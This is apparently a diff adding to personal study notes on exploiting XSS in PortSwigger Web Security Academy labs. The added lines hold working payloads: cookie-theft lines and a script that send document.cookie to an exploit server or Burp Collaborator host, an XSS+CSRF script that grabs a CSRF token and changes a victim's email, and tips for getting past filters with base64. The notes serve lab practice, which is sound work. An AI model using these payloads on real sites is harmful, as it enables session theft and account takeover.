@@ -58,8 +58,37 @@ XSS大概率是要bypass的，可以参考这个
 https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/
 
 How to get victim's cookie?
+对于DOM和Reflected来说，因为payload是放在url中的，所以通常使用下面这些方法来传递cookie.
 1. fetch('exploit_server/?document.cookie()')
 2. location='https://lab/?query=(document.location="https://exploitserver/?document.cookie")
+
+Stored xss因为通常可以写比较长的js，所以功能会相对比较丰富。当然DOM/Reflected的方法也可以用。
+XSS + CSRF
+https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/my-account',true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/my-account/change-email', true);
+    changeReq.send('csrf='+token+'&email=test@test.com')
+};
+</script>
+
+XSS + CORS
+https://portswigger.net/web-security/cors/lab-breaking-https-attack
+
+https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies
+<script>
+fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
+</script>
 
 If it is blocked, you may need to encode with base64. You can first base64 with btoa(payload) in your browser's console. Then you can use atob(payload) as your final payload.
 
